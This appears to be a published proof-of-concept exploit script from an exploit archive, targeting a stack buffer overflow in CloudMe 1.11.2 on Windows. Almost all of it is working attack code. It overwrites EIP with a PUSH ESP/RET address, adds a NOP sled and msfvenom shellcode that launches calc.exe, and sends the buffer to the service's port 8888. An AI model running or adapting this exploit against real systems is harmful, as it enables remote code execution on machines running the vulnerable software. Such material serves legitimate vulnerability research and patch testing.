# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xb8\xc6\xc7\x24\x91\xd9\xce\xd9\x74\x24\xf4\x5a\x2b"
payload += b"\xc9\xb1\x52\x83\xc2\x04\x31\x42\x0e\x03\x84\xc9\xc6"
payload += b"\x64\xf4\x3e\x84\x87\x04\xbf\xe9\x0e\xe1\x8e\x29\x74"
payload += b"\x62\xa0\x99\xfe\x26\x4d\x51\x52\xd2\xc6\x17\x7b\xd5"
payload += b"\x6f\x9d\x5d\xd8\x70\x8e\x9e\x7b\xf3\xcd\xf2\x5b\xca"
payload += b"\x1d\x07\x9a\x0b\x43\xea\xce\xc4\x0f\x59\xfe\x61\x45"
payload += b"\x62\x75\x39\x4b\xe2\x6a\x8a\x6a\xc3\x3d\x80\x34\xc3"
payload += b"\xbc\x45\x4d\x4a\xa6\x8a\x68\x04\x5d\x78\x06\x97\xb7"
payload += b"\xb0\xe7\x34\xf6\x7c\x1a\x44\x3f\xba\xc5\x33\x49\xb8"
payload += b"\x78\x44\x8e\xc2\xa6\xc1\x14\x64\x2c\x71\xf0\x94\xe1"
payload += b"\xe4\x73\x9a\x4e\x62\xdb\xbf\x51\xa7\x50\xbb\xda\x46"
payload += b"\xb6\x4d\x98\x6c\x12\x15\x7a\x0c\x03\xf3\x2d\x31\x53"
payload += b"\x5c\x91\x97\x18\x71\xc6\xa5\x43\x1e\x2b\x84\x7b\xde"
payload += b"\x23\x9f\x08\xec\xec\x0b\x86\x5c\x64\x92\x51\xa2\x5f"
payload += b"\x62\xcd\x5d\x60\x93\xc4\x99\x34\xc3\x7e\x0b\x35\x88"
payload += b"\x7e\xb4\xe0\x1f\x2e\x1a\x5b\xe0\x9e\xda\x0b\x88\xf4"
payload += b"\xd4\x74\xa8\xf7\x3e\x1d\x43\x02\xa9\x28\x9e\x02\x04"
payload += b"\x45\x9c\x1a\x4c\x9f\x29\xfc\x1a\x8f\x7f\x57\xb3\x36"
payload += b"\xda\x23\x22\xb6\xf0\x4e\x64\x3c\xf7\xaf\x2b\xb5\x72"
payload += b"\xa3\xdc\x35\xc9\x99\x4b\x49\xe7\xb5\x10\xd8\x6c\x45"
payload += b"\x5e\xc1\x3a\x12\x37\x37\x33\xf6\xa5\x6e\xed\xe4\x37"
payload += b"\xf6\xd6\xac\xe3\xcb\xd9\x2d\x61\x77\xfe\x3d\xbf\x78"
payload += b"\xba\x69\x6f\x2f\x14\xc7\xc9\x99\xd6\xb1\x83\x76\xb1"
payload += b"\x55\x55\xb5\x02\x23\x5a\x90\xf4\xcb\xeb\x4d\x41\xf4"
payload += b"\xc4\x19\x45\x8d\x38\xba\xaa\x44\xf9\xca\xe0\xc4\xa8"
payload += b"\x42\xad\x9d\xe8\x0e\x4e\x48\x2e\x37\xcd\x78\xcf\xcc"
payload += b"\xcd\x09\xca\x89\x49\xe2\xa6\x82\x3f\x04\x14\xa2\x15"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)